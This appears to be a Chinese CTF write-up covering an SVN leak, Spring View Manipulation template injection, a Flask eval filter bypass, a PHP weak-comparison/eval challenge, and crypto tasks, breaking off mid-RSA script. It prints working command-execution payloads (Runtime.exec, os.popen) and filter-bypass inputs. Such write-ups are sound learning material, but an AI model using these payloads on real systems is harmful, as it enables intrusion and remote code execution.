<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="63426e5096ea3509e6d9755a6a1e6e92">input_data</h1>
<p>题目描述：无</p>
<p>开始提示svn泄露</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155109-c185ecd8-7f00-1.png"/></p>
<p>路由<code>.svn</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155114-c49ddc1e-7f00-1.png"/></p>
<p><code>/.svn/pristine/57/57d4b4b90f7139cf064ee991e8f78bd8fc2a8a6d.svn-base</code>翻找到flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155118-c7289708-7f00-1.png"/></p>
<h1 data-content="1" id="1fd887eb7d1fdcfe4c7e6b8546e80b6b">admin</h1>
<p>题目描述：成为管理员试试</p>
<p>开题，给了一个路由</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155124-ca6914a6-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155128-ccfb9c02-7f00-1.png"/></p>
<p>后端是Java，Spring Boot框架</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155133-cfa88726-7f00-1.png"/></p>
<p>扫一下后台</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155138-d2a8c18e-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155142-d51841ce-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155145-d73bdf60-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155150-da24e762-7f00-1.png"/></p>
<p>访问一下相关的路由</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155156-dda90c74-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155201-e056742a-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155205-e306141e-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155210-e5d73a42-7f00-1.png"/></p>
<p>在<code>/admin;</code>路由处爆破到一个参数path。结合报错信息，发现可能存在<strong>Spring View Manipulation(Java)</strong>的模板注入</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155217-e9dd31f0-7f00-1.png"/></p>
<p><a href="https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability" target="_blank">https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability</a></p>
<p>payload：</p>
<pre><code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x</code></pre>
<p>改一下直接抓flag</p>
<pre><code>http://101.200.58.4:3333/admin;/?path=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::Jay17</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155223-edab3a0c-7f00-1.png"/></p>
<pre><code>http://101.200.58.4:3333/admin;/?path=__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20%2Fflag%22).getInputStream()).next()%7D__%3A%3AJay17</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155228-f09d54de-7f00-1.png"/></p>
<h1 data-content="1" id="0b297339958891ddb41d54bb6c3f25a6">flask</h1>
<p>题目描述：为了安全，ban掉了好多字符呢，还有方法能绕过吗？</p>
<p>附件给了源码</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="n">evalme</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'evalme'</span><span class="p">)</span>

    <span class="k">if</span> <span class="p">((</span><span class="ow">not</span> <span class="n">evalme</span><span class="p">)</span> <span class="ow">or</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">'[A-Zd-z</span><span class="se">\\</span><span class="s1">. /*$#@!+^]'</span><span class="p">,</span> <span class="n">evalme</span><span class="p">)):</span>
        <span class="k">return</span> <span class="s1">'hacker?'</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">evalme</span><span class="p">),</span> <span class="s1">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">8080</span><span class="p">)</span>
</pre></div>
<p>过滤真狠。本地测一下执行命令payload类似于<code>__import__('os').system('env')</code>（500，在终端显示结果），读取文件payload类似于<code>"app.py"</code>（无过滤下）</p>
<p>这题用到了一个工具<code>parselmouth</code></p>
<p><a href="https://github.com/Macr0phag3/parselmouth" target="_blank">https://github.com/Macr0phag3/parselmouth</a></p>
<p>我们使用自定义模式</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155236-f5873852-7f00-1.png"/></p>
<p><code>mytool.py</code></p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">parselmouth</span> <span class="kn">as</span> <span class="nn">p9h</span>

<span class="k">def</span> <span class="nf">python_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="n">black_list</span><span class="p">):</span>
    <span class="c1"># p9h.BLACK_CHAR = [xxxx]</span>
    <span class="n">p9h</span><span class="o">.</span><span class="n">BLACK_CHAR</span> <span class="o">=</span> <span class="n">black_list</span>
    <span class="n">runner</span> <span class="o">=</span> <span class="n">p9h</span><span class="o">.</span><span class="n">P9H</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="n">versbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">runner</span><span class="o">.</span><span class="n">visit</span><span class="p">()</span>
    <span class="n">status</span><span class="p">,</span> <span class="n">c_result</span> <span class="o">=</span> <span class="n">p9h</span><span class="o">.</span><span class="n">color_check</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>


<span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">' '</span><span class="p">,</span> <span class="s1">'!'</span><span class="p">,</span> <span class="s1">'#'</span><span class="p">,</span> <span class="s1">'$'</span><span class="p">,</span> <span class="s1">'*'</span><span class="p">,</span> <span class="s1">'+'</span><span class="p">,</span> <span class="s1">'.'</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">,</span> <span class="s1">'@'</span><span class="p">,</span> <span class="s1">'^'</span><span class="p">,</span> <span class="s1">'A'</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">,</span> <span class="s1">'C'</span><span class="p">,</span> <span class="s1">'D'</span><span class="p">,</span> <span class="s1">'E'</span><span class="p">,</span> <span class="s1">'F'</span><span class="p">,</span> <span class="s1">'G'</span><span class="p">,</span> <span class="s1">'H'</span><span class="p">,</span> <span class="s1">'I'</span><span class="p">,</span> <span class="s1">'J'</span><span class="p">,</span> <span class="s1">'K'</span><span class="p">,</span> <span class="s1">'L'</span><span class="p">,</span> <span class="s1">'M'</span><span class="p">,</span> <span class="s1">'N'</span><span class="p">,</span> <span class="s1">'O'</span><span class="p">,</span> <span class="s1">'P'</span><span class="p">,</span> <span class="s1">'Q'</span><span class="p">,</span> <span class="s1">'R'</span><span class="p">,</span> <span class="s1">'S'</span><span class="p">,</span> <span class="s1">'T'</span><span class="p">,</span> <span class="s1">'U'</span><span class="p">,</span> <span class="s1">'V'</span><span class="p">,</span> <span class="s1">'W'</span><span class="p">,</span> <span class="s1">'X'</span><span class="p">,</span> <span class="s1">'Y'</span><span class="p">,</span> <span class="s1">'Z'</span><span class="p">,</span> <span class="s1">'d'</span><span class="p">,</span> <span class="s1">'e'</span><span class="p">,</span> <span class="s1">'f'</span><span class="p">,</span> <span class="s1">'g'</span><span class="p">,</span> <span class="s1">'h'</span><span class="p">,</span> <span class="s1">'i'</span><span class="p">,</span> <span class="s1">'j'</span><span class="p">,</span> <span class="s1">'k'</span><span class="p">,</span> <span class="s1">'l'</span><span class="p">,</span> <span class="s1">'m'</span><span class="p">,</span> <span class="s1">'n'</span><span class="p">,</span> <span class="s1">'o'</span><span class="p">,</span> <span class="s1">'p'</span><span class="p">,</span> <span class="s1">'q'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">,</span> <span class="s1">'s'</span><span class="p">,</span> <span class="s1">'t'</span><span class="p">,</span> <span class="s1">'u'</span><span class="p">,</span> <span class="s1">'v'</span><span class="p">,</span> <span class="s1">'w'</span><span class="p">,</span> <span class="s1">'x'</span><span class="p">,</span> <span class="s1">'y'</span><span class="p">,</span> <span class="s1">'z'</span><span class="p">]</span>

<span class="n">shell</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\'</span><span class="s2">/flag</span><span class="se">\'</span><span class="s2">"</span>
<span class="c1"># shell = "__import__('os').popen('cat /flag').read()"</span>

<span class="n">shell_17</span><span class="o">=</span><span class="n">python_shell</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="n">blacklist</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">shell_17</span><span class="p">)</span>


<span class="c1">#示例</span>
<span class="sd">'''</span>
<span class="sd">import parselmouth as p9h</span>

<span class="sd">p9h.BLACK_CHAR = [".", "'", '"', "chr", "dict"]</span>
<span class="sd">runner = p9h.P9H(</span>
<span class="sd">    "__import__('os').popen('whoami').read()",</span>
<span class="sd">    specify_bypass_map={"black": {"Bypass_Name": ["by_unicode"]}}, </span>
<span class="sd">    ensure_min=True, versbose=0,</span>
<span class="sd">)</span>
<span class="sd">result = runner.visit()</span>
<span class="sd">status, c_result = p9h.color_check(result)</span>
<span class="sd">print(status, c_result, result)</span>

<span class="sd">'''</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155245-fa993566-7f00-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155248-fcc90cb2-7f00-1.png"/></p>
<p><img src="https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240922171313351.png"/></p>
<p>因为字符<code>%</code>和<code>c</code>都可以用，所以还有一种payload：</p>
<pre><code>/?evalme="%c%c%c%c%c"%(47,102,108,97,103)</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155254-fff149b8-7f00-1.png"/></p>
<h1 data-content="1" id="040efa7b5c2f3843abca5920dd0f7d15">如此多的FLAG</h1>
<p>题目描述：找到正确的flag</p>
<p>开题，点击登录</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155259-034fed8a-7f01-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155308-08414b18-7f01-1.png"/></p>
<p>这个登录没有用，看一下源码，发现<code>/F1aaj.php</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155312-0adc698e-7f01-1.png"/></p>
<p>根据提示，查看Cookie</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155330-15b537dc-7f01-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155334-18149784-7f01-1.png"/></p>
<p>访问<code>/FLLL4g.php</code>直接给了源码：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155340-1b4892fc-7f01-1.png"/></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'X'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$temp</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'X'</span><span class="p">];</span>
    <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="o">?</span> <span class="k">die</span><span class="p">(</span><span class="s2">"no numeric"</span><span class="p">)</span> <span class="o">:</span> <span class="k">NULL</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$temp</span> <span class="o">&gt;</span> <span class="mi">9999</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"Pupil.&lt;/br&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"NO!NO!NO!"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"Where is X?"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Y'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$md5</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Y'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$md5</span><span class="o">==</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"Junior school student.&lt;/br&gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"NO!NO!NO!"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"Where is Y?"</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Z'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Z'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">60</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"No long!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">' '</span><span class="p">,</span> <span class="s1">'\''</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">,</span> <span class="s1">'`'</span><span class="p">,</span> <span class="s1">'\['</span><span class="p">,</span> <span class="s1">'\]'</span><span class="p">,</span> <span class="s1">'\{'</span><span class="p">,</span>  <span class="s1">'}'</span><span class="p">,</span> <span class="s1">'\t'</span><span class="p">,</span> <span class="s1">'\r'</span><span class="p">,</span> <span class="s1">'\n'</span><span class="p">];</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">'/m'</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">"NO!NO!NO!"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$security</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'abs'</span><span class="p">,</span> <span class="s1">'base_convert'</span><span class="p">,</span> <span class="s1">'cos'</span><span class="p">,</span> <span class="s1">'dechex'</span><span class="p">,</span> <span class="s1">'exp'</span><span class="p">,</span> <span class="s1">'f1ag'</span><span class="p">,</span> <span class="s1">'getrandmax'</span><span class="p">,</span> <span class="s1">'hexdec'</span><span class="p">,</span> <span class="s1">'is_nan'</span><span class="p">,</span> <span class="s1">'log'</span><span class="p">,</span> <span class="s1">'max'</span><span class="p">,</span> <span class="s1">'octdec'</span><span class="p">,</span> <span class="s1">'pi'</span><span class="p">,</span> <span class="s1">'sin'</span><span class="p">,</span> <span class="s1">'tan'</span><span class="p">];</span>
    <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$security</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">"NO!NO!NO!"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">eval</span><span class="p">(</span><span class="s1">'echo '</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">';'</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$f1ag</span><span class="p">)){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$f1ag</span> <span class="o">==</span> <span class="s2">"flag"</span><span class="p">){</span>
            <span class="k">echo</span> <span class="s2">"Senior high school student.&lt;/br&gt;"</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">"Here_is_flag!!!!!!!"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"NO!NO!NO!"</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s2">"Where is Z?"</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>前两个if很好绕过</p>
<pre><code>/FLLL4g.php?X=9999999a&amp;Y=0e215962017</code></pre>
<p>难的是后面的一个，虽然题目没写，但是感觉满足<code>if($f1ag == "flag")</code>就会给flag</p>
<p>黑名单是这个：<code>$blacklist = [' ', '\'', '"', '反引号', '\[', '\]', '\{',  '}', '\t', '\r', '\n'];</code></p>
<p>如果用了函数，那么只能用这些：<code>['abs', 'base_convert', 'cos', 'dechex', 'exp', 'f1ag', 'getrandmax', 'hexdec', 'is_nan', 'log', 'max', 'octdec', 'pi', 'sin', 'tan']</code></p>
<p>其实不用想这么多，弱比较直接过了，请看demo：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="nv">$f1ag</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$f1ag</span> <span class="o">==</span> <span class="s2">"flag"</span><span class="p">){</span>
    <span class="k">echo</span> <span class="s2">"Senior high school student.&lt;/br&gt;"</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">"Here_is_flag!!!!!!!"</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155350-2141d66e-7f01-1.png"/></p>
<p>payload：</p>
<pre><code>/FLLL4g.php?X=9999999a&amp;Y=0e215962017&amp;Z=17;$f1ag=0</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155354-240ecc62-7f01-1.png"/></p>
<h1 data-content="1" id="edec8414ab0ee7a0a2f9cc73f466d222">encode</h1>
<p>分析代码，魔改的base64。以前做过这题，在CSDN上找到原题了，直接ctrl c  ctrl v,然后过了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240930155401-27d7a6a2-7f01-1.png"/></p>
<h1 data-content="1" id="ed3e3b6a8e3580b8e83943ea435b3971">math_rsa</h1>
<p>简单的数学问题：<br/>
f'(x)=dy/dx (f(x)的一阶导数）<br/>
f''(x)=d²y/dx²=d(dy/dx)/dx (f(x)的二阶导数)<br/>
f''(x)=a*f''(x)+b 带入点可以求出a,b,以此求原函数f''(x)，f'(x)，f(x)，<br/>
f(x)需要爆破flag的第一位，遍历可打印字符即可可以看出应该第一位是t<br/>
恢复f(x)，求出前部分flag,然后copper攻击</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span> <span class="n">bytes_to_long</span>

<span class="c1"># Given RSA parameters</span>
<span class="n">n</span> <span class="o">=</span> <span class="mi">2260375559104345425590426977960386256287009777233277062625487017885931446911942921201492850167115455071935831283269948569220356763988762825230315520633702443866690239945242948370781975714325308306543337600783340792458991506685843729962897796956171467876531084194426101796617903015810156717396227079274786269217370618477266867389155551378798713259843750289765858717627925689021561352438080039804957145513478767641674644346609224034274906228784593435462413278410143</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">c</span> <span class="o">=</span> <span class="mi">1683427726786225271109289808778075351906457081282891335272956455076290407290946927840180672315908981114229434899424882579823897506730018911375238394076293908946844135295984336122170362703361647325169444373502665686779049846717305377396296752361918921007897449738856962248716579014267597667341690453460130215215256776249910808564677407383996700090361822122676428069577517468851642648993930679875398568383201032360229083338487146673018350740571719960730053254352184</span>

<span class="c1"># Vectors with integer values</span>
<span class="n">v1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3149069</span><span class="p">,</span> <span class="mi">2271689</span><span class="p">,</span> <span class="mi">2337632</span><span class="p">,</span> <span class="mi">3068562</span><span class="p">,</span> <span class="mi">67697</span><span class="p">,</span> <span class="mi">2337632</span><span class="p">,</span> <span class="mi">3068562</span><span class="p">,</span> <span class="mi">67697</span><span class="p">,</span> <span class="mi">2143547</span><span class="p">,</span> <span class="mi">2543093</span><span class="p">,</span> <span class="mi">1844472</span><span class="p">,</span> <span class="mi">2206998</span><span class="p">,</span> <span class="mi">67697</span><span class="p">,</span> 
      <span class="mi">1844472</span><span class="p">,</span> <span class="mi">2686547</span><span class="p">,</span> <span class="mi">2020317</span><span class="p">,</span> <span class="mi">67697</span><span class="p">,</span> <span class="mi">3149069</span><span class="p">,</span> <span class="mi">2271689</span><span class="p">,</span> <span class="mi">2081324</span><span class="p">,</span> <span class="mi">67697</span><span class="p">,</span> <span class="mi">2143547</span><span class="p">,</span> <span class="mi">2543093</span><span class="p">,</span> <span class="mi">1844472</span><span class="p">,</span> <span class="mi">2206998</span><span class="p">,</span> <span class="mi">67697</span><span class="p">,</span> 
      <span class="mi">2337632</span><span class="p">,</span> <span class="mi">3068562</span><span class="p">,</span> <span class="mi">67697</span><span class="p">,</span> <span class="mi">2143547</span><span class="p">,</span> <span class="mi">2543093</span><span class="p">,</span> <span class="mi">1844472</span><span class="p">,</span> <span class="mi">2206998</span><span class="p">,</span> <span class="mi">3752378</span><span class="p">]</span>
<span class="n">v2</span> <span class="o">=</span> <span class="p">[</span><span class="mi">59499825996845</span><span class="p">,</span> <span class="mi">30963434563085</span><span class="p">]</span>
<span class="n">v3</span> <span class="o">=</span> <span class="p">[</span><span class="mi">713997911962144</span><span class="p">,</span> <span class="mi">371561214757024</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">calculate_coefficients</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">v3</span><span class="p">):</span>
    <span class="sd">""" </span>
<span class="sd">    Calculate the coefficients a3 and b3 based on the differences between the values in v2 and v3. </span>
<span class="sd">    Returns: a3 (slope), b3 (intercept) for the linear equation. </span>
<span class="sd">    """</span>
    <span class="n">a3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">v3</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">//</span> <span class="p">(</span><span class="n">v2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">v2</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="n">b3</span> <span class="o">=</span> <span class="p">(</span><span class="n">v3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">a3</span> <span class="o">*</span> <span class="n">v2</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">a3</span><span class="p">,</span> <span class="n">b3</span>

<span class="k">def</span> <span class="nf">calculate_a2_b2_c2</span><span class="p">(</span><span class="n">a3</span><span class="p">,</span> <span class="n">b3</span><span class="p">,</span> <span class="n">v1</span><span class="p">):</span>
    <span class="sd">""" </span>
<span class="sd">    Calculate the coefficients a2, b2, and c2 based on a3 and b3. </span>
<span class="sd">    a2 is half of a3, b2 is the same as b3, and c2 is calculated using the first value from v1. </span>
<span class="sd">    Returns: a2, b2, c2 for the quadratic equation. </span>
<span class="sd">    """</span>
    <span class="n">a2</span> <span class="o">=</span> <span class="n">a3</span> <span class="o">//</span> <span class="mi">2</span>
    <span class="n">b2</span> <span class="o">=</span> <span class="n">b3</span>
    <span class="n">c2</span> <span class="o">=</span> <span class="n">v2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">a2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">**</span><span class="mi">2</span> <span class="o">-</span> <span class="n">b2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">a2</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">c2</span>

<span class="k">def</span> <span class="nf">calculate_a1_b1_c1_d1</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="n">b2</span><span class="p">,</span> <span class="n">c2</span><span class="p">,</span> <span class="n">v1</span><span class="p">):</span>
    <span class="sd">""" </span>
<span class="sd">    Calculate coefficients a1, b1, c1, d1 for the cubic equation. </span>
<span class="sd">    """</span>
    <span class="n">a1</span> <span class="o">=</span> <span class="n">a2</span> <span class="o">//</span> <span class="mi">3</span>
    <span class="n">b1</span> <span class="o">=</span> <span class="n">b2</span> <span class="o">//</span> <span class="mi">2</span>
    <span class="n">c1</span> <span class="o">=</span> <span class="n">c2</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">116</span>  <span class="c1"># Example constant, could vary depending on problem context</span>
    <span class="n">d1</span> <span class="o">=</span> <span class="n">v1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="p">(</span><span class="n">a1</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="n">b1</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">a1</span><span class="p">,</span> <span class="n">b1</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">d1</span>

<span class="k">def</span> <span class="nf">find_flag</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">b1</span><span class="p">,</span> <span class="n">c1</span><span class="p">,</span> <span class="n">d1</span><span class="p">,</span> <span class="n">v1</span><span class="p">):</span>
    <span class="sd">""" </span>
<span class="sd">    Find and return the flag based on the cubic equation and v1 values. </span>
<span class="sd">    """</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">34</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">v1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">a1</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">3</span> <span class="o">+</span> <span class="n">b1</span> <span class="o">*</span> <span class="n">x</span><span class="o">**</span><span class="mi">2</span> <span class="o">+</span> <span class="n">c1</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="n">d1</span><span class="p">:</span>
                <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">flag</span>

<span class="c1"># Coefficient calculation steps</span>
